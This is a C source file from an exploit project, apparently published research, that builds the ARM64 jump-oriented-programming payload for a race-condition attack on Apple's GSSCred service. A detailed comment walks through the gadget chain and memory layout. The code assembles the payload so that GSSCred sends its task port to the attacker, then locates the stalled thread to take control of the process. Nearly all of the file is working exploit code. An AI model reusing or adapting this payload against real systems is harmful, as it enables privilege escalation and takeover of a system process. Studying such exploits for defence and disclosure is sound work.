/*
 * gsscred-race
 * Brandon Azad
 *
 *
 * The ARM64 exploit payload
 * ------------------------------------------------------------------------------------------------
 *
 *  Here's a detailed runthrough of one of the exploit strategies used by the exploit payload on
 *  ARM64.
 *
 *
 *  The JOP program
 *  ---------------
 *
 *  We can't actually inject new code into GSSCred, so we use JOP to reuse existing code fragments
 *  in useful ways. The following listing shows the full execution of the JOP program, starting
 *  from the moment we get PC control.
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  	ENTRY:
 *  		REGION_ARG1 = {
 *  			 0 : ISA (generic payload)
 *  			20 : _longjmp
 *  			28 : REGION_JMPBUF
 *  		}
 *  		REGION_JMPBUF = {
 *  			 0 : x19 = REGION_X19
 *  			 8 : x20 = INITIAL_REMOTE_AND_LOCAL_PORT
 *  			10 : x21 = PORT_INCREMENT
 *  			18 : x22 = JOP_STACK_FINALIZE
 *  			20 : x23 = mach_msg_send
 *  			28 : x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
 *  			30 : x25 = LDP_X8_X2_X19__BLR_X8
 *  			38 : x26 = MAX_REMOTE_AND_LOCAL_PORT
 *  			40 : x27 = REGION_MACH_MESSAGE
 *  			58 : x30 = LDP_X8_X2_X19__BLR_X8
 *  			68 : sp = FAKE_STACK_ADDRESS
 *  		}
 *  		REGION_X19 = {
 *  			 0 : LDP_X3_X2_X2__BR_X3
 *  			 8 : JOP_STACK_INCREMENT_PORT_AND_BRANCH
 *  			10 : BLR_X8
 *  			78 = REGION_MACH_MESSAGE
 *  			80 : REGION_MACH_MESSAGE[8]
 *  		}
 *  		REGION_MACH_MESSAGE = {
 *  			 0 : msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, 0);
 *  			 4 : msgh_size = sizeof(mach_msg_header_t) = 0x18
 *  			 8 : msgh_remote_port
 *  			 c : msgh_local_port
 *  			10 : msgh_voucher_port = 0
 *  			14 : msgh_id = GSSCRED_RACE_MACH_MESSAGE_ID
 *  		}
 *  		JOP_STACK_INCREMENT_PORT_AND_BRANCH = [
 *  			ADD_X1_X21_X20__BLR_X8
 *  			MOV_X20_X1_BLR_X8
 *  			STR_X1_X19_80__BLR_X8
 *  			MOV_X0_X26__BLR_X8
 *  			SUB_X1_X1_X0__BLR_X8
 *  			MOV_X13_X1__BR_X8
 *  			MOV_X9_X13__BR_X8
 *  			MOV_X11_X24__BR_X8
 *  			CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8
 *  			MOV_X9_X22__BR_X8
 *  			CSEL_X2_X11_X9_LT__BLR_X8
 *  		]
 *  		JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP = [
 *  			MOV_X0_X27__BLR_X8
 *  			BLR_X23__MOV_X0_X21__BLR_X25
 *  		]
 *  		JOP_STACK_FINALIZE = [
 *  			LDR_X8_X19_10__BLR_X8
 *  		]
 *  		x0 = REGION_ARG1
 *  		pc = LDP_X1_X0_X0_20__BR_X1
 *
 *  	;; We get control of PC with X0 pointing to a fake "name" Objective-C object.
 *  	;; The isa pointer is managed by the generic part of the payload, but
 *  	;; everything after that is usable for the arm64 payload.
 *  	;;
 *  	;; Before entering the main loop, we need to set registers x19 through x27. We
 *  	;; could try to preserve the callee-saved registers and x29, x30, and sp so
 *  	;; that our caller could resume after the exploit payload runs, but it's easier
 *  	;; to just obliterate these registers and permanently stall this thread so that
 *  	;; the corruption never manifests a crash. Unfortunately, this also means we
 *  	;; leak all associated resources, so we have only one shot before we risk
 *  	;; violating the Jetsam limit.
 *  	;;
 *  	;; We need to set the following register values:
 *  	;; 	x19 = REGION_X19
 *  	;; 	x20 = INITIAL_REMOTE_AND_LOCAL_PORT
 *  	;; 	x21 = PORT_INCREMENT
 *  	;; 	x22 = JOP_STACK_FINALIZE
 *  	;; 	x23 = mach_msg_send
 *  	;; 	x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
 *  	;; 	x25 = LDP_X8_X2_X19__BLR_X8
 *  	;; 	x26 = MAX_REMOTE_AND_LOCAL_PORT
 *  	;; 	x27 = REGION_MACH_MESSAGE
 *
 *  	LDP_X1_X0_X0_20__BR_X1 (common):
 *  			ldp x1, x0, [x0, #0x20]
 *  			br x1
 *  		x1 = REGION_ARG1[20] = _longjmp
 *  		x0 = REGION_ARG1[28] = REGION_JMPBUF
 *
 *  	_longjmp:
 *  		x19 = REGION_X19
 *  		x20 = INITIAL_REMOTE_AND_LOCAL_PORT
 *  	 	x21 = PORT_INCREMENT
 *  	 	x22 = JOP_STACK_FINALIZE
 *  	 	x23 = mach_msg_send
 *  	 	x24 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
 *  	 	x25 = LDP_X8_X2_X19__BLR_X8
 *  	 	x26 = MAX_REMOTE_AND_LOCAL_PORT
 *  	 	x27 = REGION_MACH_MESSAGE
 *  		x30 = LDP_X8_X2_X19__BLR_X8
 *  		sp = FAKE_STACK_ADDRESS
 *  		pc = LDP_X8_X2_X19__BLR_X8
 *
 *  	;; We are about to enter the main loop, which will repeatedly send Mach
 *  	;; messages containing the the current process's task port to incrementing
 *  	;; remote port numbers.
 *  	;;
 *  	;; These are the registers during execution:
 *  	;; 	x2 = Current JOP stack position
 *  	;; 	x3 = Current gadget
 *  	;; 	x8 = LDP_X3_X2_X2__BR_X3
 *  	;; 	x20 = CURRENT_REMOTE_AND_LOCAL_PORT
 *
 *  	LDP_X8_X2_X19__BLR_X8 (CoreUtils):
 *  			ldp x8, x2, [x19]
 *  			blr x8
 *  		x8 = REGION_X19[0] = LDP_X3_X2_X2__BR_X3
 *  		x2 = REGION_X19[8] = JOP_STACK_INCREMENT_PORT_AND_BRANCH
 *  		pc = LDP_X3_X2_X2__BR_X3
 *
 *  	;; This is our dispatch gadget. It reads gadgets to execute from a "linked
 *  	;; list" JOP stack.
 *
 *  	LDP_X3_X2_X2__BR_X3 (CoreFoundation, Heimdal):
 *  			ldp x3, x2, [x2]
 *  			br x3
 *  		x3 = ADD_X1_X21_X20__BLR_X8
 *  		pc = ADD_X1_X21_X20__BLR_X8
 *
 *  	;; The first JOP stack we execute is JOP_STACK_INCREMENT_PORT_AND_BRANCH. We
 *  	;; increment the remote Mach port via a register containing the combined remote
 *  	;; and local port numbers, test if the remote Mach port is above the limit, and
 *  	;; branch to either send the message and loop again or finish running the
 *  	;; exploit payload.
 *
 *  	ADD_X1_X21_X20__BLR_X8 (libxml2):
 *  			add x1, x21, x20
 *  			blr x8
 *  		x1 = CURRENT_REMOTE_AND_LOCAL_PORT + PORT_INCREMENT = NEXT_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X20_X1_BLR_X8
 *
 *  	MOV_X20_X1_BLR_X8 (libswiftCore, MediaPlayer):
 *  			mov x20, x1
 *  			blr x8
 *  		x20 = NEXT_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = STR_X1_X19_80__BLR_X8
 *
 *  	STR_X1_X19_80__BLR_X8 (libswiftCore):
 *  			str x1, [x19, #0x80]
 *  			blr x8
 *  		REGION_X19[80] = REGION_MACH_MESSAGE[8] = NEXT_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X0_X26__BLR_X8
 *
 *  	MOV_X0_X26__BLR_X8 (common):
 *  			mov x0, x26
 *  			blr x8
 *  		x0 = MAX_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = SUB_X1_X1_X0__BLR_X8
 *
 *  	SUB_X1_X1_X0__BLR_X8 (libswiftCore):
 *  			sub x1, x1, x0
 *  			blr x8
 *  		x1 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X13_X1__BR_X8
 *
 *  	MOV_X13_X1__BR_X8 (CloudKitDaemon, MediaToolbox):
 *  			mov x13, x1
 *  			br x8
 *  		x13 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X9_X13__BR_X8
 *
 *  	MOV_X9_X13__BR_X8 (AirPlaySender, SafariShared):
 *  			mov x9, x13
 *  			br x8
 *  		x9 = NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X11_X24__BR_X8
 *
 *  	MOV_X11_X24__BR_X8 (AirPlayReceiver, CloudKitDaemon):
 *  			mov x11, x24
 *  			br x8
 *  		x11 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8
 *
 *  	;; Compare x9 (NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT) to 0. If
 *  	;; x9 is less than 0, then NEXT_REMOTE_AND_LOCAL_PORT is less than
 *  	;; MAX_REMOTE_AND_LOCAL_PORT, and so we should send the message and loop again.
 *  	;; Otherwise, we should exit the loop.
 *
 *  	CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8 (TextInputCore):
 *  			cmp x9, #0
 *  			csel x1, x10, x9, eq
 *  			blr x8
 *  		nzcv = CMP(NEXT_REMOTE_AND_LOCAL_PORT - MAX_REMOTE_AND_LOCAL_PORT, 0)
 *  		x1 = CLOBBER
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = MOV_X9_X22__BR_X8
 *
 *  	MOV_X9_X22__BR_X8 (MediaToolbox, StoreServices):
 *  			mov x9, x22
 *  			br x8
 *  		x9 = JOP_STACK_FINALIZE
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = CSEL_X2_X11_X9_LT__BLR_X8
 *
 *  	CSEL_X2_X11_X9_LT__BLR_X8 (AppleCVA, libLLVM):
 *  			csel x2, x11, x9, lt
 *  			blr x8
 *  		if (NEXT_REMOTE_AND_LOCAL_PORT < MAX_REMOTE_AND_LOCAL_PORT)
 *  			x2 = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP
 *  		else
 *  			x2 = JOP_STACK_FINALIZE
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		if (NEXT_REMOTE_AND_LOCAL_PORT < MAX_REMOTE_AND_LOCAL_PORT)
 *  			pc = JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP[0]
 *  		else
 *  			pc = JOP_STACK_FINALIZE[0]
 *
 *  	;; If the conditional is true, we execute from
 *  	;; JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP. This JOP stack sends the Mach message
 *  	;; and then runs the JOP_STACK_INCREMENT_PORT_AND_BRANCH stack again.
 *
 *  	MOV_X0_X27__BLR_X8 (common):
 *  			mov x0, x27
 *  			blr x8
 *  		x0 = REGION_MACH_MESSAGE
 *  		pc = LDP_X3_X2_X2__BR_X3
 *  		pc = BLR_X23__MOV_X0_X21__BLR_X25
 *
 *  	BLR_X23__MOV_X0_X21__BLR_X25 (MediaToolbox):
 *  			blr x23
 *  			mov x0, x21
 *  			blr x25
 *  		pc = mach_msg_send
 *  		x0 = PORT_INCREMENT
 *  		pc = LDP_X8_X2_X19__BLR_X8
 *
 *  	;; If the conditional is false, we execute from JOP_STACK_FINALIZE. This JOP
 *  	;; stack is responsible for ending execution of the exploit payload in a way
 *  	;; that leaves the GSSCred process running.
 *  	;;
 *  	;; Ideally we'd do one of two things:
 *  	;; 	- Return to the caller in a consistent state. The caller would then
 *  	;; 	  continue running as usual and release associated resources.
 *  	;; 	- Cancel or suspend the current thread. This prevents further
 *  	;; 	  corruption and resource consumption, but leaks currently consumed
 *  	;; 	  resources.
 *  	;;
 *  	;; Unfortunately fixing the corruption seems difficult at best and
 *  	;; pthread_exit() aborts in the current context. The only remaining good option
 *  	;; is a live wait. For simplicity we simply enter an infinite loop.
 *
 *  	LDR_X8_X19_10__BLR_X8 (common):
 *  			ldr x8, [x19, #0x10]
 *  			blr x8
 *  		x8 = BLR_X8
 *  		pc = BLR_X8
 *
 *  	BLR_X8 (common):
 *  			blr x8
 *  		pc = BLR_X8
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *
 *  Memory layout
 *  -------------
 *
 *  We can lay out memory for the payload as follows:
 *
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *  	        +----------------------------------------------------------------+
 *  	      0 |AACCCCCCAAAA    KKKKKKKKLLLL    DDDDDDBBBBBBBBBBBBBBBBBB    BB  |
 *  	    100 |BB      JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ            |
 *  	        +----------------------------------------------------------------+
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *
 *  	        A  =  REGION_ARG1                           =  0 - 30  @   0
 *  	        B  =  REGION_JMPBUF                         =  0 - 70  @  98
 *  	        C  =  REGION_X19                            =  0 - 18  @   8
 *  	        D  =  REGION_MACH_MESSAGE                   =  0 - 18  @  78 + REGION_X19
 *
 *  	        J  =  JOP_STACK_INCREMENT_PORT_AND_BRANCH   =  0 - b0  @ 120
 *  	        K  =  JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP  =  0 - 20  @  40
 *  	        L  =  JOP_STACK_FINALIZE                    =  0 - 10  @  60
 *
 */

#include "arm64/arm64_payload.h"

#include "apple_private.h"
#include "arm64/gadgets.h"
#include "log.h"

#include <assert.h>
#include <mach/mach.h>
#include <setjmp.h>
#include <sys/types.h>

// Static assertions.
static_assert(sizeof(mach_msg_header_t) == 0x18, "Unexpected size of mach_msg_header_t");
static_assert(__LITTLE_ENDIAN__, "Architecture is not little-endian");

// Check that all the necessary gadgets for this JOP payload are provided by the platform.
static bool
check_platform() {
	bool all_found = true;
#define NEED(gadget)									\
	if (gadgets[gadget].address == 0) {						\
		DEBUG_TRACE(1, "Could not find gadget: %s", gadgets[gadget].str);	\
		all_found = false;							\
	}
	NEED(LDP_X1_X0_X0_20__BR_X1);
	NEED(LDP_X8_X2_X19__BLR_X8);
	NEED(LDP_X3_X2_X2__BR_X3);
	NEED(ADD_X1_X21_X20__BLR_X8);
	NEED(MOV_X20_X1_BLR_X8);
	NEED(STR_X1_X19_80__BLR_X8);
	NEED(MOV_X0_X26__BLR_X8);
	NEED(SUB_X1_X1_X0__BLR_X8);
	NEED(MOV_X13_X1__BR_X8);
	NEED(MOV_X9_X13__BR_X8);
	NEED(MOV_X11_X24__BR_X8);
	NEED(CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8);
	NEED(MOV_X9_X22__BR_X8);
	NEED(CSEL_X2_X11_X9_LT__BLR_X8);
	NEED(MOV_X0_X27__BLR_X8);
	NEED(BLR_X23__MOV_X0_X21__BLR_X25);
	NEED(LDR_X8_X19_10__BLR_X8);
	NEED(BLR_X8);
#undef NEED
	return all_found;
}

#define ARRSIZE(x)	(sizeof(x) / sizeof(x[0]))

// Build the JOP payload.
static void
build_payload(uint8_t *payload) {
	// Mach ports increment by 4.
	const uint64_t PORT_INCREMENT = 4;

	// When the REMOTE_AND_LOCAL_PORT value is stored in the Mach message, it will be laid out
	// from least significant byte to most significant byte. This means the lower 4 bytes fill
	// out the remote port and the higher 4 bytes fill out the local port. We want the local
	// port to be 0x103, the constant value for mach_task_self().
	const uint64_t INITIAL_REMOTE_AND_LOCAL_PORT = 0x0000010300000203 - PORT_INCREMENT;

	// The Mach port sent in the setattributes message tends to be allocated a low port number;
	// almost certainly it will be in the first 100000 ports.
	const uint64_t MAX_REMOTE_AND_LOCAL_PORT = INITIAL_REMOTE_AND_LOCAL_PORT + PORT_INCREMENT * 100000;

	// Unfortunately, using the _longjmp gadget to set x19 through x28 means we will also have
	// to replace sp. Since our payload will be sprayed to address
	// GSSCRED_RACE_PAYLOAD_ADDRESS, an address slightly below that will almost certainly be
	// mapped and available for use as a replacement stack address.
	const uint64_t FAKE_STACK_ADDRESS = GSSCRED_RACE_PAYLOAD_ADDRESS - GSSCRED_RACE_PAYLOAD_SIZE;

	// Define the offsets from the start of the payload to each of the memory regions.
	const ssize_t BASE = PAYLOAD_OFFSET_ARG1;
	const ssize_t OFFSET_REGION_ARG1                          = BASE +   0x0;
	const ssize_t OFFSET_REGION_JMPBUF                        = BASE +  0x98;
	const ssize_t OFFSET_REGION_X19                           = BASE +   0x8;
	const ssize_t OFFSET_REGION_MACH_MESSAGE                  = OFFSET_REGION_X19 + 0x78;
	const ssize_t OFFSET_JOP_STACK_INCREMENT_PORT_AND_BRANCH  = BASE + 0x120;
	const ssize_t OFFSET_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP = BASE +  0x40;
	const ssize_t OFFSET_JOP_STACK_FINALIZE                   = BASE +  0x60;

	// Get the address of each of the memory regions in the local payload buffer.
	uint8_t *payload_INITIAL_PC                           = payload + PAYLOAD_OFFSET_PC;
	uint8_t *payload_REGION_ARG1                          = payload + OFFSET_REGION_ARG1;
	uint8_t *payload_REGION_JMPBUF                        = payload + OFFSET_REGION_JMPBUF;
	uint8_t *payload_REGION_X19                           = payload + OFFSET_REGION_X19;
	mach_msg_header_t *payload_REGION_MACH_MESSAGE        = (mach_msg_header_t *) (payload + OFFSET_REGION_MACH_MESSAGE);
	uint8_t *payload_JOP_STACK_INCREMENT_PORT_AND_BRANCH  = payload + OFFSET_JOP_STACK_INCREMENT_PORT_AND_BRANCH;
	uint8_t *payload_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP = payload + OFFSET_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP;
	uint8_t *payload_JOP_STACK_FINALIZE                   = payload + OFFSET_JOP_STACK_FINALIZE;

	// Get the address of each of the memory regions in the remote payload.
	const uint64_t ADDRESS = GSSCRED_RACE_PAYLOAD_ADDRESS;
	uint64_t address_REGION_JMPBUF                        = ADDRESS + OFFSET_REGION_JMPBUF;
	uint64_t address_REGION_X19                           = ADDRESS + OFFSET_REGION_X19;
	uint64_t address_REGION_MACH_MESSAGE                  = ADDRESS + OFFSET_REGION_MACH_MESSAGE;
	uint64_t address_JOP_STACK_INCREMENT_PORT_AND_BRANCH  = ADDRESS + OFFSET_JOP_STACK_INCREMENT_PORT_AND_BRANCH;
	uint64_t address_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP = ADDRESS + OFFSET_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP;
	uint64_t address_JOP_STACK_FINALIZE                   = ADDRESS + OFFSET_JOP_STACK_FINALIZE;

	// Set the initial PC value.
	*(uint64_t *)(payload_INITIAL_PC) = gadgets[LDP_X1_X0_X0_20__BR_X1].address;

	// Construct REGION_ARG1.
	*(uint64_t *)(payload_REGION_ARG1 + 0x20) = (uint64_t) _longjmp;
	*(uint64_t *)(payload_REGION_ARG1 + 0x28) = address_REGION_JMPBUF;

	// Construct REGION_JMPBUF.
	*(uint64_t *)(payload_REGION_JMPBUF +  0x0) = address_REGION_X19;
	*(uint64_t *)(payload_REGION_JMPBUF +  0x8) = INITIAL_REMOTE_AND_LOCAL_PORT;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x10) = PORT_INCREMENT;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x18) = address_JOP_STACK_FINALIZE;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x20) = (uint64_t) mach_msg_send;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x28) = address_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x30) = gadgets[LDP_X8_X2_X19__BLR_X8].address;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x38) = MAX_REMOTE_AND_LOCAL_PORT;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x40) = address_REGION_MACH_MESSAGE;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x58) = gadgets[LDP_X8_X2_X19__BLR_X8].address;
	*(uint64_t *)(payload_REGION_JMPBUF + 0x68) = FAKE_STACK_ADDRESS;

	// Construct REGION_X19.
	*(uint64_t *)(payload_REGION_X19 +  0x0) = gadgets[LDP_X3_X2_X2__BR_X3].address;
	*(uint64_t *)(payload_REGION_X19 +  0x8) = address_JOP_STACK_INCREMENT_PORT_AND_BRANCH;
	*(uint64_t *)(payload_REGION_X19 + 0x10) = gadgets[BLR_X8].address;

	// Construct REGION_MACH_MESSAGE.
	payload_REGION_MACH_MESSAGE->msgh_bits         = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, 0);
	payload_REGION_MACH_MESSAGE->msgh_size         = sizeof(mach_msg_header_t);
	payload_REGION_MACH_MESSAGE->msgh_voucher_port = 0;
	payload_REGION_MACH_MESSAGE->msgh_id           = EXPLOIT_MACH_MESSAGE_ID;

	// Values for constructing JOP chains.
	struct JOP_DISPATCH_NODE {
		uint64_t x3;
		uint64_t x2;
	} *payload_JOP_DISPATCH_NODE;
	uint64_t address_next_JOP_DISPATCH_NODE;

	// Construct JOP_STACK_INCREMENT_PORT_AND_BRANCH.
	unsigned JOP_STACK_INCREMENT_PORT_AND_BRANCH[] = {
		ADD_X1_X21_X20__BLR_X8,
		MOV_X20_X1_BLR_X8,
		STR_X1_X19_80__BLR_X8,
		MOV_X0_X26__BLR_X8,
		SUB_X1_X1_X0__BLR_X8,
		MOV_X13_X1__BR_X8,
		MOV_X9_X13__BR_X8,
		MOV_X11_X24__BR_X8,
		CMP_X9_0__CSEL_X1_X10_X9_EQ__BLR_X8,
		MOV_X9_X22__BR_X8,
		CSEL_X2_X11_X9_LT__BLR_X8,
	};
	address_next_JOP_DISPATCH_NODE = address_JOP_STACK_INCREMENT_PORT_AND_BRANCH;
	payload_JOP_DISPATCH_NODE = (struct JOP_DISPATCH_NODE *) payload_JOP_STACK_INCREMENT_PORT_AND_BRANCH;
	for (size_t i = 0; i < ARRSIZE(JOP_STACK_INCREMENT_PORT_AND_BRANCH); i++) {
		address_next_JOP_DISPATCH_NODE += sizeof(*payload_JOP_DISPATCH_NODE);
		payload_JOP_DISPATCH_NODE->x3 = gadgets[JOP_STACK_INCREMENT_PORT_AND_BRANCH[i]].address;
		payload_JOP_DISPATCH_NODE->x2 = address_next_JOP_DISPATCH_NODE;
		payload_JOP_DISPATCH_NODE++;
	}

	// Construct JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP.
	unsigned JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP[] = {
		MOV_X0_X27__BLR_X8,
		BLR_X23__MOV_X0_X21__BLR_X25,
	};
	address_next_JOP_DISPATCH_NODE = address_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP;
	payload_JOP_DISPATCH_NODE = (struct JOP_DISPATCH_NODE *) payload_JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP;
	for (size_t i = 0; i < ARRSIZE(JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP); i++) {
		address_next_JOP_DISPATCH_NODE += sizeof(*payload_JOP_DISPATCH_NODE);
		payload_JOP_DISPATCH_NODE->x3 = gadgets[JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP[i]].address;
		payload_JOP_DISPATCH_NODE->x2 = address_next_JOP_DISPATCH_NODE;
		payload_JOP_DISPATCH_NODE++;
	}

	// Construct JOP_STACK_FINALIZE.
	unsigned JOP_STACK_FINALIZE[] = {
		LDR_X8_X19_10__BLR_X8,
	};
	address_next_JOP_DISPATCH_NODE = address_JOP_STACK_FINALIZE;
	payload_JOP_DISPATCH_NODE = (struct JOP_DISPATCH_NODE *) payload_JOP_STACK_FINALIZE;
	for (size_t i = 0; i < ARRSIZE(JOP_STACK_FINALIZE); i++) {
		address_next_JOP_DISPATCH_NODE += sizeof(*payload_JOP_DISPATCH_NODE);
		payload_JOP_DISPATCH_NODE->x3 = gadgets[JOP_STACK_FINALIZE[i]].address;
		payload_JOP_DISPATCH_NODE->x2 = address_next_JOP_DISPATCH_NODE;
		payload_JOP_DISPATCH_NODE++;
	}
}

static enum process_exploit_message_result
process_message(const mach_msg_header_t *exploit_message,
		mach_port_t *task_port, mach_port_t *thread_port) {
	enum process_exploit_message_result result = PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE;
	// The task port is stored in the remote_port field of the header.
	mach_port_t task = exploit_message->msgh_remote_port;
	bool task_valid = check_task_port(task);
	if (!task_valid) {
		goto fail_0;
	}
	// At this point the exploit message was valid and contained a task port, so any failure
	// means we should kill the target process before retrying.
	result = PROCESS_EXPLOIT_MESSAGE_RESULT_KILL_AND_RETRY;
	// We will find the thread by iterating through the existing threads until we find which
	// one is stalled in the infinite loop.
	thread_act_array_t threads = NULL;
	mach_msg_type_number_t thread_count = 0;
	kern_return_t kr = task_threads(task, &threads, &thread_count);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not get threads for task: %x", kr);
		goto fail_1;
	}
	// Loop through the threads until one of them is stuck at our expected PC.
	DEBUG_TRACE(2, "thread_count: %u", thread_count);
	mach_port_t thread = MACH_PORT_NULL;
	const size_t MAX_TRIES = 10000000;
	for (size_t try = 0;; try++) {
		bool any = false;
		for (size_t i = 0; i < thread_count; i++) {
			arm_thread_state64_t thread_state;
			mach_msg_type_number_t thread_state_count = ARM_THREAD_STATE64_COUNT;
			kr = thread_get_state(threads[i], ARM_THREAD_STATE64,
					(thread_state_t) &thread_state, &thread_state_count);
			if (kr != KERN_SUCCESS) {
				WARNING("Could not get thread state for thread %x", threads[i]);
				continue;
			}
			any = true;
			if (thread_state.__x[8] == thread_state.__pc
					&& thread_state.__pc == gadgets[BLR_X8].address) {
				thread = threads[i];
				DEBUG_TRACE(1, "Exploit thread is %x", thread);
				goto found;
			}
		}
		// If none of the thread ports are giving status info, something's fishy.
		if (!any) {
			ERROR("Could not get thread state for any thread");
			goto fail_2;
		}
		// If we just can't seem to find the thread, give up.
		if (try >= MAX_TRIES) {
			ERROR("No thread appears to be running the exploit payload "
					"after %zu tries", try);
			goto fail_2;
		}
	}
found:
	result = PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS;
	*task_port   = task;
	*thread_port = thread;
fail_2:
	for (size_t i = 0; i < thread_count; i++) {
		if (threads[i] != thread) {
			mach_port_deallocate(mach_task_self(), threads[i]);
		}
	}
	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) threads,
			thread_count * sizeof(threads[0]));
fail_1:
	if (result != PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS) {
		mach_port_deallocate(mach_task_self(), task);
	}
fail_0:
	return result;
}

const struct payload_strategy payload_strategy_1 = {
	.check_platform  = check_platform,
	.build_payload   = build_payload,
	.process_message = process_message,
};
